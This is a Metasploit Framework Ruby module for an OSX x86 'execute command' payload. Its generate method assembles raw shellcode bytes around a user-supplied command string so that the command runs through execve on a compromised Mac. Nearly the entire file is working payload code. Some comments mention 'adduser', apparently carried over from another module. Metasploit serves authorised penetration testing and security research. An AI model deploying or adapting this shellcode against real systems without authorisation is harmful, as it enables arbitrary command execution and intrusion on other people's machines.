##
# $Id: exec.rb 6479 2009-04-13 14:33:26Z kris $
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


###
#
# Exec
# ----
#
# Executes an arbitrary command.
#
###
module Metasploit3

	include Msf::Payload::Single

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'OSX Execute Command',
			'Version'       => '$Revision: 6479 $',
			'Description'   => 'Execute an arbitrary command',
			'Author'        => 'snagg <snagg[at]openssl.it>',
			'License'       => BSD_LICENSE,
			'Platform'      => 'osx',
			'Arch'          => ARCH_X86))

		# Register adduser options
		register_options(
			[
				OptString.new('CMD',  [ true,  "The command string to execute" ]),
			], self.class)
	end

	#
	# Dynamically builds the adduser payload based on the user's options.
	#
	def generate
		cmd     = datastore['CMD'] || ''
		payload =
			"\x31\xc0\x50"+ 
			Rex::Arch::X86.call(cmd.length + 1) + cmd +
			"\x00\x5e\x89\xe7\xb9\x1e\x00" +
			"\x00\x00\xfc\xf2\xa4\x89\xe3\x50" +
			"\x50\x53\xb0\x3b\x50\xcd\x80"
	end

end